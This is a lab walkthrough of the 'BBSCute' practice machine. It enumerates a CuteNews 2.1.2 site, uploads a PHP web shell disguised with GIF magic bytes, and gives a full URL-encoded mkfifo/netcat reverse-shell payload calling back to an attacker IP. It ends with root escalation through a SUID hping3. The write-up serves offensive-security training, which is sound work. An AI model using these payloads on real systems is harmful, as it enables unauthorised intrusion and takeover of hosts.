BBSCute

Target IP: 192.168.170.128

Scanning



There are five TCP ports open on the host machine. I will start my enumeration with the port 80 HTTP application.

Enumeration

Port 80: HTTP


Running gobuster dir -u http://192.168.170.128 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt gave me the result above.



The index.php is an interesting webpage. The application name and version is also provided above: CuteNews 2.1.2. There is also a verified public exploit with EDB-ID of 48800. But it requires authentication, so we need to find a username & password for this exploit to work.


From my manual enumeration, I did find a page called captcha.php. This page produces a captcha which is needed for registeration of an account.


Then I created an account.


I decided to manually exploit this machine. To do this, I created a file with the name img.php with the code GIF8;<?php system($_REQUEST['cmd']) ?>. This magic bytes should be enough to bypass any basic filtering; however, it seems like the web application is not using any filtering.


Then I pressed the Browse... button to locate and upload the img.php. After pressing Save Changes, I clicked on the picture and dropped it onto a new tab. By doing this, it opened a new URL with the link to my profile picture. This link pointed to http://cute.calipendula/uploads/avatar_test_img.php.


And now I am able to use the parameter cmd to perform RCE. It is time to gain a reverse shell connection.

Exploitation


I used a standard PHP reverse shell. Then I started a listener on port 8443 and got a reverse shell connection, once I deployed the payload by the browser.
PHP payload used: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.211%208443%20%3E%2Ftmp%2Ff
Full URL with payload: http://cute.calipendula/uploads/avatar_test_img.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.211%208443%20%3E%2Ftmp%2Ff

Privilege Escalation


Looks like hping3 can be used to gain a root shell.


I tried this PE many times, but I forgot to upgrade my shell before using the command to elevate my privileges. I had to make sure I used python3 -c 'import pty; pty.spawn("/bin/bash");' before using /usr/sbin/hping3 and then /bin/sh -p. But now I have the root shell.
